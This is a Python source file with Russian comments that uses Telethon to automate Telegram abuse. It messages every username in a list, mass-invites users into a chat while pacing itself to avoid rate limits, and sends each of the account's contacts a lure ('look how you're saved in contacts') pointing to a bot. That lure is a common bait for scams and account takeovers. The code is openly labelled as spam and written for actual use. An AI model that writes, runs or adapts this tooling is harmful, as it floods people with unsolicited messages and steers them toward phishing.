import asyncio
import logging
import random
from telethon.errors import FloodWaitError, RPCError, BadRequestError
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from src import texts
from telegram_manager import TelegramManager

'''
1. spam_received_users - Функция для отправки сообщений пользователям из файла.
2. invite_in_group - Функция по приглашению пользователей в группы, чаты 
3. spam_in_contacts - Спам по контактам
'''

logging.basicConfig(level=logging.DEBUG)

class SpamUsers(TelegramManager):
    def __init__(self, session_path: str):
        super().__init__(session_path)

    async def spam_received_users(self):

        try:
            await self.manager.start()
            logging.info("Авторизация прошла успешно!")

            with open('users.txt', 'r') as f:
                lines = f.readlines()
                count = 0
                for line in lines:
                    line = line.strip()
                    if not line:
                        continue

                    try:
                        await self.manager.send_message(line, random.choice(texts.text1))
                        count += 1
                        print(count)

                        logging.info(f"Сообщение {line} отправлено!")
                        # await asyncio.sleep(random.randint(80, 150))

                    except FloodWaitError as e:
                        logging.warning(f'Нужно подождать {e.seconds} секунд')
                        # await asyncio.sleep(e.seconds)
                    except ValueError as e:
                        logging.error(f'Неверный username {line}: {e}')
                    except RPCError as e:
                        logging.error(f'Ошибка: {e}')
                    except BadRequestError as e:
                        logging.error(f"Ошибка запроса: {e}")
        except ConnectionError as e:
            logging.error(f"Ошибка при старте клиента: {e}")


    async def invite_in_group(self):
        try:
            ''' 
            TO-DO:
            1. Добавить логи;
            2. Добавить обработку текстового файла, что бы не было повторных приглашений
            '''
            await self.manager.start()
            logging.info('Авторизация прошла успешно!')

            target_group = await self.manager.get_entity('ЧАТ')

            # Загрузка пользователей (список usernames)
            with open('users.txt', 'r') as f:
                lines = f.readlines()
                users = []
                for line in lines:
                    users.append(line)

            max_messages_per_session = 46
            count = 0

            for user in users:
                try:
                    user_entity = await self.manager.get_entity(user)
                    await self.manager(InviteToChannelRequest(target_group, [user_entity]))
                    if count >= max_messages_per_session:
                        break

                    logging.info(f"Приглашён: {user}")
                    await asyncio.sleep(random.randint(60, 120))
                except Exception as e:
                    logging.error(f"Ошибка с {user}: {e} {type(e)}")
        except TypeError as e:
            logging.error(f'[INFO] Ошибка TypeError : {e}')


    async def spam_in_contacts(self):
        try:
            await self.manager.start()
            logging.info("Авторизация прошла успешно!")

            contacts = await self.manager(GetContactsRequest(hash=0))  # Получаем все контакты
            logging.info(f"Найдено {len(contacts.contacts)} контактов")

            count = 0
            for contact in contacts.contacts:
                try:

                    if hasattr(contact, 'user_id'):
                        message = '''ахахах, смотри как тебя подписали в контактах @gt2345_bot'''
                        await self.manager.send_message(contact.user_id, message)
                        count += 1
                        logging.info(f"Сообщение отправлено: ({getattr(contact, 'username', 'Без username')})")
                        print(f'Проспамлено: {count} аккаунтов')
                        # await asyncio.sleep(20)

                except FloodWaitError as e:
                    logging.warning(f'FloodWait: ждем {e.seconds} секунд')
                    # await asyncio.sleep(e.seconds)
                except RPCError as e:
                    logging.error(f"Ошибка RPC: {e}")
                    # await asyncio.sleep(20)
                except Exception as e:
                    logging.error(f"Неизвестная ошибка в цикле: {e}")
                    # await asyncio.sleep(20)

        except Exception as e:
            logging.error(f"Неизвестная ошибка: {e}")
            # await asyncio.sleep(20)